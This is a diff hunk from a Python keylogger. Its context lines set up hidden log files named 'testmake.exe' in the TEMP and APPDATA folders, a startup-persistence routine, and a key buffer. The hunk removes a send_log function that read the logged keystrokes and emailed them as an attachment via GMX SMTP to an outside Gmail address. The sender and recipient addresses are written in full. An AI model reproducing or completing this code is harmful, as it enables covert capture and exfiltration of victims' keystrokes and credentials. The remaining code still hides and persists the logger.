@@ -95,31 +95,10 @@ def ensure_startup():
             SetFileAttributes(p, 2)
     return paths[1:]
 
-def send_log():
-    with open(paths[0], "rb")as f:
-        c1 = f.read()
-    with open(paths[1], "rb")as f:
-        c2 = f.read()
-
-    email = "LuckyLuke1200@gmx.de"
-
-
-    msg = EmailMessage()
-    msg['From'] = email
-    msg['To'] = "schlusseldieb@gmail.com"
-
-    msg.add_attachment(c1, maintype="application", subtype="executable")
-
-    with smtplib.SMTP_SSL("mail.gmx.net", 587)as f:
-        f.login(email, pw)
-        f.send(msg)
-
-
 #paths = ensure_startup()
 paths =[getenv("TEMP") + "\\testmake.exe", getenv("APPDATA") + "\\testmake.exe"]
 last_keys = []
 logger1 = setup_logger("1", paths[0])
 logger2 = setup_logger("2", paths[1])
-send_log()
 #win_main()
 
